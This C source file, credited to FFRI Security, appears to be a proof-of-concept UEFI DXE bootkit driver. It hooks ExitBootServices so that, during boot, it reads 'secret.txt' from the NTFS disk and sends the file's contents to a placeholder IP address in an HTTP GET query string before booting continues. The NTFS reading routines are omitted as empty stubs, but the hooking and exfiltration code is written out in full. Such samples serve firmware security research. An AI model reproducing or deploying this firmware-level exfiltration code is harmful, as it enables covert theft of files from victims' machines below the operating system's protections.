/*
 * (c) FFRI Security, Inc., 2024 / Author: FFRI Security, Inc.
 */

#include <Uefi.h>
#include <Library/UefiLib.h>
#include <Library/PrintLib.h>
#include <Library/UefiRuntimeServicesTableLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/BaseMemoryLib.h>
#include <Guid/FileInfo.h>
#include <Protocol/Http.h>
#include <Protocol/ServiceBinding.h>

#define BYTE unsigned char

#define HANDLE_ERROR(status) \
  if(EFI_ERROR(status)) { \
    Print(L"error: %r at %a:%d\r\n", Status, __FILE__, __LINE__); \
    return status; \
  }


EFI_EXIT_BOOT_SERVICES gOrigExitBootServices;
EFI_HTTP_PROTOCOL *gHttpProtocol;
EFI_FILE_PROTOCOL *gFileProtocol;

static BOOLEAN gRequestCallbackComplete = FALSE;
static VOID EFIAPI RequestCallback(IN EFI_EVENT Event, IN VOID *Context) {
  gRequestCallbackComplete = TRUE;
}



/**

  [Omitted] Get EFI_FILE_PROTOCOL of NTFS if the protocol exists

**/
EFI_STATUS
EFIAPI
NtfsInit (
    IN VOID
  )
{
}




/**

  [Omitted] Read files from NTFS

**/
EFI_STATUS
EFIAPI
NtfsRead (
    IN   CHAR16  *FilePath,
    OUT  BYTE   **RawFileContent,
    OUT  UINTN   *RawFileSize
  )
{
}




/**

  Locate EFI_HTTP_PROTOCOL and configure

**/
EFI_STATUS
EFIAPI
HttpInit (
    IN VOID
  )
{
  EFI_STATUS Status;

  EFI_SERVICE_BINDING_PROTOCOL *ServiceBinding;
  Status = gBS->LocateProtocol(
      &gEfiHttpServiceBindingProtocolGuid,
      NULL,
      (VOID**)&ServiceBinding
      );
  HANDLE_ERROR(Status);

  EFI_HANDLE *Handle = NULL;
  Status = ServiceBinding->CreateChild(
      ServiceBinding,
      (VOID**)&Handle
      );
  HANDLE_ERROR(Status);

  Status = gBS->HandleProtocol(
      Handle,
      &gEfiHttpProtocolGuid,
      (VOID**)&gHttpProtocol
      );
  HANDLE_ERROR(Status);

  EFI_HTTPv4_ACCESS_POINT Ipv4Node;
  ZeroMem(&Ipv4Node, sizeof(Ipv4Node));
  Ipv4Node.UseDefaultAddress = TRUE;

  EFI_HTTP_CONFIG_DATA ConfigData;
  ConfigData.HttpVersion          = HttpVersion11;
  ConfigData.TimeOutMillisec      = 0;
  ConfigData.LocalAddressIsIPv6   = FALSE;
  ConfigData.AccessPoint.IPv4Node = &Ipv4Node;

  Status = gHttpProtocol->Configure(
      gHttpProtocol,
      &ConfigData
      );
  HANDLE_ERROR(Status);

  return EFI_SUCCESS;
}



/**

  Send SendData over HTTP

**/
EFI_STATUS
EFIAPI
HttpSend (
    IN  VOID   *SendData,
    IN  UINTN  SendDataSize
  )
{
  EFI_STATUS Status;
  CHAR16 url[1024] = L"http://XXX.XXX.XXX.XXX/hoge.txt?data=";

  // Temporary Ascii to Unicode...
  BYTE  tmp[512];
  UINTN tmpSize = SendDataSize;
  for(int i=0,j=0; i<SendDataSize; i++,j+=2) {
    tmp[j]   = *(BYTE*)(SendData+i);
    tmp[j+1] = 0; 
    tmpSize++;
  }
  CopyMem((void*)url+StrLen(url)*sizeof(CHAR16), tmp, tmpSize);

  EFI_HTTP_REQUEST_DATA RequestData;
  RequestData.Method = HttpMethodGet;
  RequestData.Url    = url;

  EFI_HTTP_HEADER RequestHeader[1];
  RequestHeader[0].FieldName  = "Host";
  RequestHeader[0].FieldValue = "Sample Sample Sample";

  EFI_HTTP_MESSAGE RequestMessage;
  RequestMessage.Data.Request = &RequestData;
  RequestMessage.HeaderCount  = 1;
  RequestMessage.Headers      = RequestHeader;
  RequestMessage.BodyLength   = 0;
  RequestMessage.Body         = NULL;

	EFI_HTTP_TOKEN RequestToken;
  RequestToken.Event = NULL;
  Status = gBS->CreateEvent(
      EVT_NOTIFY_SIGNAL,
      TPL_CALLBACK,
      RequestCallback,
      NULL,
      &RequestToken.Event);
	HANDLE_ERROR(Status);

  RequestToken.Status  = EFI_SUCCESS;
  RequestToken.Message = &RequestMessage;

  gRequestCallbackComplete = FALSE;

  Status = gHttpProtocol->Request(
      gHttpProtocol,
      &RequestToken);
  HANDLE_ERROR(Status);

  while(!gRequestCallbackComplete) {}

  return EFI_SUCCESS;
}



/**

  ExitBootServices Hook routine

**/
EFI_STATUS
EFIAPI
ExitBootServicesHook(
    IN EFI_HANDLE ImageHandle,
    IN UINTN      MapKey
    )
{
  gBS->ExitBootServices = gOrigExitBootServices;

  BYTE* FileContent;
  UINTN  FileSize = 0;

  NtfsInit();
  NtfsRead(L"secret.txt", &FileContent, &FileSize);

  HttpInit();
  HttpSend(FileContent, FileSize);

  gBS->FreePool(FileContent);


  /* Get the memory map */
  EFI_STATUS             Status;
	UINTN                  MemoryMapSize;
	EFI_MEMORY_DESCRIPTOR  *MemoryMap        = NULL;
	UINTN                  LocalMapKey;
	UINTN                  DescriptorSize    = 0;
	UINT32                 DescriptorVersion = 0;
	
  Status = gBS->GetMemoryMap(
      &MemoryMapSize,
      MemoryMap,
      &LocalMapKey,
      &DescriptorSize,
      &DescriptorVersion
      );

  if (Status == EFI_BUFFER_TOO_SMALL) {
      gBS->AllocatePool(
          EfiLoaderData,
          MemoryMapSize + 2*DescriptorSize,
          (VOID**)&MemoryMap
          );
      Status = gBS->GetMemoryMap(
          &MemoryMapSize,
          MemoryMap,
          &LocalMapKey,
          &DescriptorSize,
          &DescriptorVersion
          );      
  }

	return gOrigExitBootServices(ImageHandle,LocalMapKey); 
}




/**

  Driver Entry

**/
EFI_STATUS
EFIAPI
DxeEntry(
    IN EFI_HANDLE        ImageHandle,
    IN EFI_SYSTEM_TABLE *SystemTable
    )
{
	// Hook
  gOrigExitBootServices = gBS->ExitBootServices;
  gBS->ExitBootServices = ExitBootServicesHook;

  return EFI_SUCCESS;
}
